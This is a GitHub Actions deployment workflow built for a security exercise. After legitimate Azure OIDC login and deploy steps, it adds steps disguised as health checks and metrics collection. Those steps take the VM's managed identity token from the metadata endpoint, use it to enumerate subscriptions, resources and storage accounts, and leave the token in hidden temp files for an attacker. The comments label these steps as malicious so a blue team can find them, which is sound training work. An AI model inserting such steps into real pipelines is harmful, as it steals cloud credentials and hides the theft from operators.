# ============================================================
# deploy.yml — Dumpster Fire App Deployment
#
# Pre-staged by exercise admin before the exercise.
# Triggered during exercise via workflow_dispatch.
#
# Contains both legitimate (OIDC login) and malicious (IMDS
# theft) steps. Blue Team must identify the malicious steps
# by correlating identity activity.
# ============================================================

name: Deploy Dumpster Fire App

on:
  workflow_dispatch:
    inputs:
      environment:
        description: 'Target environment'
        required: true
        default: 'staging'
        type: choice
        options:
          - staging
          - production

permissions:
  id-token: write
  contents: read

jobs:
  deploy:
    runs-on: self-hosted
    environment: ${{ github.event.inputs.environment }}

    steps:
      - uses: actions/checkout@v4

      - name: Set up Python
        uses: actions/setup-python@v5
        with:
          python-version: '3.11'

      - name: Install dependencies
        shell: pwsh
        run: |
          pip install -r requirements.txt

      - name: Run tests
        shell: pwsh
        run: |
          python -m pytest tests/ --tb=short

      - name: Azure Login (OIDC)
        uses: azure/login@v2
        with:
          client-id: ${{ secrets.AZURE_CLIENT_ID }}
          tenant-id: ${{ secrets.AZURE_TENANT_ID }}
          subscription-id: ${{ secrets.AZURE_SUBSCRIPTION_ID }}
          environment: AzureUSGovernment

      - name: Deploy application
        shell: pwsh
        continue-on-error: true
        run: |
          az webapp deploy --resource-group rg-dumpsterfire --name dumpsterfire-app --src-path ./app.zip

      # ═══════════════════════════════════════════════════════════
      # MALICIOUS STEPS BELOW — disguised as operational tasks
      # ═══════════════════════════════════════════════════════════

      - name: Post-deploy health check
        shell: pwsh
        run: |
          # Steals the VM's Managed Identity token via IMDS
          $headers = @{ "Metadata" = "true" }
          $url = "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-02-01&resource=https://management.usgovcloudapi.net/"
          $response = Invoke-RestMethod -Uri $url -Headers $headers -Method GET
          $response | ConvertTo-Json | Set-Content "$env:TEMP\.health_cache"

          # Extract just the token
          $token = $response.access_token
          Set-Content -Path "$env:TEMP\.health_token" -Value $token
          Write-Output "Health endpoint: OK (200)"

      - name: Verify deployment endpoints
        shell: pwsh
        run: |
          # Uses stolen MI token to enumerate ARM (not the OIDC SPN)
          $token = Get-Content "$env:TEMP\.health_token"
          $authHeaders = @{ "Authorization" = "Bearer $token" }

          # Enumerate subscriptions
          $subs = Invoke-RestMethod -Uri "https://management.usgovcloudapi.net/subscriptions?api-version=2022-12-01" -Headers $authHeaders
          $subs.value | ForEach-Object { Write-Output "Endpoint check: $($_.displayName) - healthy" } | Set-Content "$env:TEMP\.endpoint_report"

          # Enumerate resources in the subscription
          $subId = $subs.value[0].subscriptionId
          $resources = Invoke-RestMethod -Uri "https://management.usgovcloudapi.net/subscriptions/$subId/resources?api-version=2021-04-01" -Headers $authHeaders
          $resources.value | ConvertTo-Json | Set-Content "$env:TEMP\.resource_inventory"
          Write-Output "Verified $($resources.value.Count) deployment endpoints"

      - name: Collect deployment metrics
        shell: pwsh
        run: |
          # Attempts storage access with MI token (higher priv than SPN)
          $token = Get-Content "$env:TEMP\.health_token"
          $authHeaders = @{ "Authorization" = "Bearer $token" }

          # Decode token to extract subscription from claims
          $parts = $token.Split('.')
          $payload = $parts[1].Replace('-','+').Replace('_','/')
          switch ($payload.Length % 4) { 2 { $payload += '==' } 3 { $payload += '=' } }
          $claims = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($payload)) | ConvertFrom-Json
          $subId = if ($claims.xms_mirid) { ($claims.xms_mirid -split '/')[2] } else { (Get-Content "$env:TEMP\.endpoint_report" | Select-Object -First 1) -replace '.*: (.*) -.*','$1' }

          # List storage accounts
          $storageUrl = "https://management.usgovcloudapi.net/subscriptions/$subId/providers/Microsoft.Storage/storageAccounts?api-version=2023-01-01"
          $accounts = Invoke-RestMethod -Uri $storageUrl -Headers $authHeaders
          $accounts.value | ForEach-Object { "Metrics source: $($_.name) ($($_.location))" } | Add-Content "$env:TEMP\.endpoint_report"

          Get-Content "$env:TEMP\.endpoint_report"

      - name: Cleanup build artifacts
        shell: pwsh
        run: |
          Remove-Item -Path app.zip -ErrorAction SilentlyContinue
          # Intentionally does NOT clean .health_token or .resource_inventory
          # Attacker retrieves these later
          Write-Output "Cleanup complete"
